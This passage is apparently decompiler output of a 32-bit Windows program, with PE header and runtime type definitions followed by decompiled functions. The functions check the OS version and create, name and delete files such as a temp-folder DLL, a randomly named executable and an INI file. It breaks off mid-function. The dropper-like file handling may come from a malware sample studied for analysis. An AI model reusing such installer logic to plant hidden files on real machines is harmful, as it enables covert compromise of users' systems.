    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef struct CAccessibleProxy CAccessibleProxy, *PCAccessibleProxy;

struct CAccessibleProxy { // PlaceHolder Class Structure
};

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

typedef struct CDC CDC, *PCDC;

struct CDC { // PlaceHolder Structure
};

typedef struct CRuntimeClass CRuntimeClass, *PCRuntimeClass;

struct CRuntimeClass { // PlaceHolder Structure
};

typedef struct CNoTrackObject CNoTrackObject, *PCNoTrackObject;

struct CNoTrackObject { // PlaceHolder Structure
};

typedef struct CWinApp CWinApp, *PCWinApp;

struct CWinApp { // PlaceHolder Structure
};

typedef struct IAccessible IAccessible, *PIAccessible;

struct IAccessible { // PlaceHolder Structure
};

typedef struct IAccessibleProxy IAccessibleProxy, *PIAccessibleProxy;

struct IAccessibleProxy { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct __POSITION __POSITION, *P__POSITION;

struct __POSITION { // PlaceHolder Structure
};

typedef struct CArchive CArchive, *PCArchive;

struct CArchive { // PlaceHolder Structure
};

typedef struct AFX_MSGMAP_ENTRY AFX_MSGMAP_ENTRY, *PAFX_MSGMAP_ENTRY;

struct AFX_MSGMAP_ENTRY { // PlaceHolder Structure
};

typedef struct CProcessLocalObject CProcessLocalObject, *PCProcessLocalObject;

struct CProcessLocalObject { // PlaceHolder Structure
};

typedef struct tagDRAWITEMSTRUCT tagDRAWITEMSTRUCT, *PtagDRAWITEMSTRUCT;

struct tagDRAWITEMSTRUCT { // PlaceHolder Structure
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct tagDELETEITEMSTRUCT tagDELETEITEMSTRUCT, *PtagDELETEITEMSTRUCT;

struct tagDELETEITEMSTRUCT { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef enum eActCtxResult {
} eActCtxResult;

typedef struct AFX_CMDHANDLERINFO AFX_CMDHANDLERINFO, *PAFX_CMDHANDLERINFO;

struct AFX_CMDHANDLERINFO { // PlaceHolder Structure
};

typedef struct tagDISPPARAMS tagDISPPARAMS, *PtagDISPPARAMS;

struct tagDISPPARAMS { // PlaceHolder Structure
};

typedef struct CWaitCursor CWaitCursor, *PCWaitCursor;

struct CWaitCursor { // PlaceHolder Structure
};

typedef struct tagMEASUREITEMSTRUCT tagMEASUREITEMSTRUCT, *PtagMEASUREITEMSTRUCT;

struct tagMEASUREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct AFX_MAINTAIN_STATE2 AFX_MAINTAIN_STATE2, *PAFX_MAINTAIN_STATE2;

struct AFX_MAINTAIN_STATE2 { // PlaceHolder Structure
};

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

struct tagVARIANT { // PlaceHolder Structure
};

typedef struct IDispatch IDispatch, *PIDispatch;

struct IDispatch { // PlaceHolder Structure
};

typedef struct CWnd CWnd, *PCWnd;

struct CWnd { // PlaceHolder Structure
};

typedef struct tagEXCEPINFO tagEXCEPINFO, *PtagEXCEPINFO;

struct tagEXCEPINFO { // PlaceHolder Structure
};

typedef struct tagCOMPAREITEMSTRUCT tagCOMPAREITEMSTRUCT, *PtagCOMPAREITEMSTRUCT;

struct tagCOMPAREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct CFixedAllocNoSync CFixedAllocNoSync, *PCFixedAllocNoSync;

struct CFixedAllocNoSync { // PlaceHolder Structure
};

typedef struct tagINITCOMMONCONTROLSEX tagINITCOMMONCONTROLSEX, *PtagINITCOMMONCONTROLSEX;

struct tagINITCOMMONCONTROLSEX { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct CObject CObject, *PCObject;

struct CObject { // PlaceHolder Structure
};

typedef struct CPlex CPlex, *PCPlex;

struct CPlex { // PlaceHolder Structure
};

typedef struct tagWNDCLASSA tagWNDCLASSA, *PtagWNDCLASSA;

struct tagWNDCLASSA { // PlaceHolder Structure
};

typedef struct CSimpleList CSimpleList, *PCSimpleList;

struct CSimpleList { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct CPtrList CPtrList, *PCPtrList;

struct CPtrList { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct CImageList CImageList, *PCImageList;

struct CImageList { // PlaceHolder Structure
};

typedef struct CThreadLocalObject CThreadLocalObject, *PCThreadLocalObject;

struct CThreadLocalObject { // PlaceHolder Structure
};

typedef struct CThreadLocal<class_AFX_MODULE_THREAD_STATE> CThreadLocal<class_AFX_MODULE_THREAD_STATE>, *PCThreadLocal<class_AFX_MODULE_THREAD_STATE>;

struct CThreadLocal<class_AFX_MODULE_THREAD_STATE> { // PlaceHolder Structure
};

typedef struct CGdiObject CGdiObject, *PCGdiObject;

struct CGdiObject { // PlaceHolder Structure
};

typedef struct CThreadSlotData CThreadSlotData, *PCThreadSlotData;

struct CThreadSlotData { // PlaceHolder Structure
};

typedef struct CInternalGlobalLock CInternalGlobalLock, *PCInternalGlobalLock;

struct CInternalGlobalLock { // PlaceHolder Structure
};

typedef struct CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>, *PCStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>;

struct CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> { // PlaceHolder Structure
};

typedef struct CSimpleStringT<wchar_t,0> CSimpleStringT<wchar_t,0>, *PCSimpleStringT<wchar_t,0>;

struct CSimpleStringT<wchar_t,0> { // PlaceHolder Structure
};

typedef struct CSimpleStringT<char,0> CSimpleStringT<char,0>, *PCSimpleStringT<char,0>;

struct CSimpleStringT<char,0> { // PlaceHolder Structure
};

typedef struct CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_> CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>, *PCStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>;

struct CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_> { // PlaceHolder Structure
};

typedef struct CStringData CStringData, *PCStringData;

struct CStringData { // PlaceHolder Structure
};

typedef struct ATLSTRINGRESOURCEIMAGE ATLSTRINGRESOURCEIMAGE, *PATLSTRINGRESOURCEIMAGE;

struct ATLSTRINGRESOURCEIMAGE { // PlaceHolder Structure
};

typedef struct _ATL_INTMAP_ENTRY _ATL_INTMAP_ENTRY, *P_ATL_INTMAP_ENTRY;

struct _ATL_INTMAP_ENTRY { // PlaceHolder Structure
};

typedef struct CAssoc CAssoc, *PCAssoc;

struct CAssoc { // PlaceHolder Structure
};

typedef struct InitCommonControls_Type InitCommonControls_Type, *PInitCommonControls_Type;

struct InitCommonControls_Type { // PlaceHolder Structure
};

typedef struct InitCommonControlsEx_Type InitCommonControlsEx_Type, *PInitCommonControlsEx_Type;

struct InitCommonControlsEx_Type { // PlaceHolder Structure
};

typedef enum LoadArrayObjType {
} LoadArrayObjType;

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

typedef struct IUnknown IUnknown, *PIUnknown;

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

typedef struct IUnknown *LPUNKNOWN;

typedef struct _PRINTER_DEFAULTSW _PRINTER_DEFAULTSW, *P_PRINTER_DEFAULTSW;

struct _PRINTER_DEFAULTSW {
    LPWSTR pDatatype;
    LPDEVMODEW pDevMode;
    ACCESS_MASK DesiredAccess;
};

typedef struct _PRINTER_DEFAULTSW *LPPRINTER_DEFAULTSW;




void FUN_00401000(void)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_120;
  ushort uStack_c;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_120;
  _memset(&local_120.dwMajorVersion,0,0x118);
  local_120.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_120);
  if (BVar1 != 0) {
    if (local_120.dwMajorVersion == 5) {
      if (local_120.dwMinorVersion == 0) {
        if (3 < uStack_c) {
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
      }
      else if ((1 < local_120.dwMinorVersion) || (local_120.dwMinorVersion == 1)) {
        ___security_check_cookie_4(local_4 ^ (uint)&local_120);
        return;
      }
    }
    else if ((local_120.dwMajorVersion == 6) && (local_120.dwMinorVersion == 0)) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_120);
      return;
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_120);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_00401100(void)

{
  short *psVar1;
  WCHAR WVar2;
  wchar_t wVar3;
  short sVar4;
  int iVar5;
  undefined4 *puVar6;
  DWORD DVar7;
  WCHAR *pWVar8;
  undefined4 *puVar9;
  HANDLE pvVar10;
  int iVar11;
  LSTATUS LVar12;
  wchar_t *pwVar13;
  short sVar14;
  undefined2 uVar15;
  int iVar16;
  wchar_t *_Dst;
  undefined auStack_1c4c [8];
  HKEY pHStack_1c44;
  int local_1c40;
  int local_1c3c;
  int local_1c38;
  int local_1c34;
  wchar_t awStack_1c30 [64];
  short sStack_1bb0;
  wchar_t awStack_1bae [16];
  wchar_t awStack_1b8e [64];
  undefined2 uStack_1b0e;
  wchar_t awStack_1b0c [16];
  wchar_t awStack_1aec [16];
  wchar_t awStack_1acc [16];
  wchar_t awStack_1aac [16];
  wchar_t awStack_1a8c [16];
  int iStack_1a6c;
  undefined4 uStack_1a68;
  undefined4 auStack_1a34 [2];
  int iStack_1a2c;
  uint uStack_1934;
  undefined2 uStack_1930;
  uint uStack_192e;
  short sStack_192a;
  short asStack_1926 [16];
  wchar_t awStack_1906 [135];
  short asStack_17f8 [64];
  short sStack_1778;
  short asStack_1776 [80];
  undefined2 uStack_16d6;
  wchar_t local_15fc;
  undefined4 local_15fa;
  undefined4 local_15f6;
  undefined4 local_15f2;
  undefined4 local_15ee;
  undefined4 local_15ea;
  undefined4 local_15e6;
  undefined4 local_15e2;
  undefined2 local_15de;
  wchar_t local_15dc;
  undefined4 local_15da;
  undefined4 local_15d6;
  undefined4 local_15d2;
  undefined4 local_15ce;
  undefined4 local_15ca;
  undefined4 local_15c6;
  undefined4 local_15c2;
  undefined2 local_15be;
  wchar_t local_15bc;
  undefined local_15ba [126];
  wchar_t local_153c;
  undefined local_153a [126];
  wchar_t local_14bc;
  undefined local_14ba [126];
  WCHAR local_143c;
  undefined local_143a [518];
  WCHAR local_1234;
  undefined local_1232 [518];
  WCHAR local_102c;
  undefined local_102a [516];
  undefined4 uStack_e26;
  undefined local_e22 [518];
  wchar_t local_c1c;
  undefined local_c1a [518];
  WCHAR local_a14;
  undefined local_a12 [518];
  wchar_t wStack_80c;
  undefined auStack_80a [2050];
  uint local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x40110a;
  local_8 = DAT_00432c20 ^ (uint)auStack_1c4c;
  iVar16 = 0;
  local_1c38 = 0;
  local_143c = L'\0';
  _memset(local_143a,0,0x206);
  local_a14 = L'\0';
  _memset(local_a12,0,0x206);
  local_c1c = L'\0';
  _memset(local_c1a,0,0x206);
  local_15fc = L'\0';
  local_15fa = 0;
  local_15f6 = 0;
  local_15f2 = 0;
  local_15ee = 0;
  local_15ea = 0;
  local_15e6 = 0;
  local_15e2 = 0;
  local_15de = 0;
  local_14bc = L'\0';
  _memset(local_14ba,0,0x7e);
  local_153c = L'\0';
  _memset(local_153a,0,0x7e);
  sVar14 = 0;
  local_15bc = L'\0';
  _memset(local_15ba,0,0x7e);
  uVar15 = 0;
  local_102c = L'\0';
  _memset(local_102a,0,0x206);
  local_15dc = L'\0';
  local_15da = 0;
  local_15d6 = 0;
  local_15d2 = 0;
  local_15ce = 0;
  local_15ca = 0;
  local_15c6 = 0;
  local_15c2 = 0;
  local_15be = 0;
  local_1234 = L'\0';
  _memset(local_1232,0,0x206);
  uStack_e26._2_2_ = 0;
  _memset(local_e22,0,0x206);
  _memset(&local_1c34,0,0x200);
  local_1c3c = FUN_00401bd0(1);
  local_1c40 = FUN_00401bd0(0);
  GetModuleFileNameW((HMODULE)0x0,&local_a14,0x104);
  GetTempPathW(0x104,&local_143c);
  _wcscat_s(&local_143c,0x104,L"HGDraw.dll");
  pWVar8 = &local_143c;
  do {
    WVar2 = *pWVar8;
    pWVar8 = pWVar8 + 1;
  } while (WVar2 != L'\0');
  if (((int)pWVar8 - (int)local_143a >> 1 != 0) &&
     (DVar7 = GetFileAttributesW(&local_143c), DVar7 != 0xffffffff)) {
    DeleteFileW(&local_143c);
  }
  if (local_1c3c == 0) {
    if (DAT_00433fbc == 3) {
      _memset(auStack_1a34,0,0x236);
      local_1c38 = FUN_004020d0(auStack_1a34);
      if (local_1c38 != 0) {
        iVar16 = 0;
        do {
          sVar14 = *(short *)((int)asStack_1926 + iVar16);
          *(short *)(local_14ba + iVar16 + -2) = sVar14;
          iVar16 = iVar16 + 2;
        } while (sVar14 != 0);
        FUN_004024b0(uStack_192e);
        FUN_004024b0(uStack_1934);
        pwVar13 = awStack_1906;
        _Dst = &local_15fc;
        iVar16 = iStack_1a2c;
        sVar14 = sStack_192a;
        uVar15 = uStack_1930;
        goto LAB_004016b7;
      }
    }
  }
  else {
    GetTempPathW(0x104,&local_143c);
    _wcscat_s(&local_143c,0x104,awStack_1aac);
    _wcscat_s(&local_143c,0x104,L".exe");
    pWVar8 = &local_143c;
    do {
      WVar2 = *pWVar8;
      pWVar8 = pWVar8 + 1;
    } while (WVar2 != L'\0');
    if (((int)pWVar8 - (int)local_143a >> 1 != 0) &&
       (DVar7 = GetFileAttributesW(&local_143c), DVar7 != 0xffffffff)) {
      iVar16 = 0;
      do {
        psVar1 = (short *)((int)awStack_1aac + iVar16);
        *(short *)((int)auStack_1a34 + iVar16) = *psVar1;
        iVar16 = iVar16 + 2;
      } while (*psVar1 != 0);
      _wcscat_s((wchar_t *)auStack_1a34,0x104,L".exe");
      DeleteFileW(&local_143c);
    }
    _wcscpy_s(&local_15fc,0x10,awStack_1a8c);
    FUN_00401e90();
    iVar16 = FUN_00401f30();
    if (iVar16 == 1) goto LAB_00401bb3;
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)awStack_1a8c + iVar16);
      *(short *)(local_1232 + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)awStack_1a8c + iVar16);
      *(short *)(local_e22 + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    puVar6 = &uStack_e26;
    do {
      puVar9 = puVar6;
      puVar6 = (undefined4 *)((int)puVar9 + 2);
    } while (*(short *)((int)puVar9 + 2) != 0);
    *(undefined4 *)((int)puVar9 + 2) = 0x53005f;
    *(undefined4 *)((int)puVar9 + 6) = 0x4f0054;
    *(undefined4 *)((int)puVar9 + 10) = 0x50;
    pvVar10 = OpenEventW(0x20000,0,&local_1234);
    if (pvVar10 != (HANDLE)0x0) {
      CloseHandle(pvVar10);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_e26 + 2));
      pvVar10 = OpenEventW(0x20000,0,&local_1234);
      for (iVar16 = 0; (pvVar10 != (HANDLE)0x0 && (iVar16 < 5)); iVar16 = iVar16 + 1) {
        CloseHandle(pvVar10);
        Sleep(500);
        pvVar10 = OpenEventW(0x20000,0,&local_1234);
      }
    }
    Sleep(1000);
    DeleteFileW(&local_143c);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)awStack_1bae + iVar16);
      *(short *)(local_14ba + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)awStack_1c30 + iVar16);
      *(short *)(local_153a + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)awStack_1b8e + iVar16);
      *(short *)(local_15ba + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    pwVar13 = awStack_1aac;
    _Dst = &local_15dc;
    iVar16 = iStack_1a6c;
    sVar14 = sStack_1bb0;
    uVar15 = uStack_1b0e;
LAB_004016b7:
    _wcscpy_s(_Dst,0x10,pwVar13);
  }
  if (local_1c40 != 0) {
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)asStack_1776 + iVar16);
      *(short *)(local_14ba + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)asStack_17f8 + iVar16);
      *(short *)(local_153a + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 0;
    do {
      sVar14 = *(short *)((int)&DAT_0042c794 + iVar16);
      *(short *)(local_15ba + iVar16 + -2) = sVar14;
      iVar16 = iVar16 + 2;
    } while (sVar14 != 0);
    iVar16 = 5;
    if (DAT_00433fbc == 3) {
      GetSystemDirectoryW(&local_102c,0x104);
      _wcscat_s(&local_102c,0x104,(wchar_t *)&DAT_0042c888);
    }
    else {
      GetTempPathW(0x104,&local_102c);
    }
    iVar11 = 0;
    do {
      iVar5 = iVar11 + -2;
      *(short *)(local_c1a + iVar11 + -2) = *(short *)(local_102a + iVar5);
      iVar11 = iVar11 + 2;
    } while (*(short *)(local_102a + iVar5) != 0);
    _wcscat_s(&local_c1c,0x104,L"golfset.ini");
    DeleteFileW(&local_c1c);
    sVar14 = sStack_1778;
    uVar15 = uStack_16d6;
  }
  _memset(&local_1c34,0,0x200);
  local_1c34 = 0x504d534d;
  sStack_1bb0 = 0x51;
  iVar11 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0042c7c8 + iVar11);
    *(short *)((int)awStack_1c30 + iVar11) = sVar4;
    iVar11 = iVar11 + 2;
  } while (sVar4 != 0);
  uStack_1b0e = 0x2b66;
  iVar11 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0042c794 + iVar11);
    *(short *)((int)awStack_1b8e + iVar11) = sVar4;
    iVar11 = iVar11 + 2;
  } while (sVar4 != 0);
  iVar11 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0042c7e4 + iVar11);
    *(short *)((int)awStack_1bae + iVar11) = sVar4;
    iVar11 = iVar11 + 2;
  } while (sVar4 != 0);
  iStack_1a6c = 5;
  if (((local_1c3c != 0) || (local_1c38 != 0)) || (local_1c40 != 0)) {
    _wcscpy_s(awStack_1bae,0x10,&local_14bc);
    _wcscpy_s(awStack_1c30,0x40,&local_153c);
    sStack_1bb0 = sVar14;
    _wcscpy_s(awStack_1b8e,0x40,&local_15bc);
    uStack_1b0e = uVar15;
    iStack_1a6c = iVar16;
    if (iVar16 == 0) {
      iStack_1a6c = 5;
    }
  }
  if ((awStack_1c30[0] != L'\0') && (sStack_1bb0 != 0)) {
    local_1c34 = 0x504d534d;
    DVar7 = GetTickCount();
    FUN_00414927(DVar7);
    wStack_80c = L'\0';
    _memset(auStack_80a,0,0x7fe);
    if (awStack_1b0c[0] == L'\0') {
      FUN_00402530((int)&wStack_80c);
      _wcscpy_s(awStack_1b0c,0x10,&wStack_80c);
    }
    if (awStack_1aec[0] == L'\0') {
      FUN_00402530((int)&wStack_80c);
      _wcscpy_s(awStack_1aec,0x10,&wStack_80c);
    }
    if (awStack_1aac[0] == L'\0') {
      FUN_00402530((int)&wStack_80c);
      _wcscpy_s(awStack_1aac,0x10,&wStack_80c);
    }
    if (awStack_1a8c[0] == L'\0') {
      FUN_00402530((int)&wStack_80c);
      _wcscpy_s(awStack_1a8c,0x10,&wStack_80c);
      pwVar13 = &local_15fc;
      do {
        wVar3 = *pwVar13;
        pwVar13 = pwVar13 + 1;
      } while (wVar3 != L'\0');
      if ((int)pwVar13 - (int)&local_15fa >> 1 != 0) {
        _wcscpy_s(awStack_1a8c,0x10,&local_15fc);
      }
    }
    pwVar13 = &local_15dc;
    do {
      wVar3 = *pwVar13;
      pwVar13 = pwVar13 + 1;
    } while (wVar3 != L'\0');
    if ((int)pwVar13 - (int)&local_15da >> 1 != 0) {
      _wcscpy_s(awStack_1acc,0x10,&local_15dc);
    }
    if (awStack_1acc[0] == L'\0') {
      FUN_00402530((int)&wStack_80c);
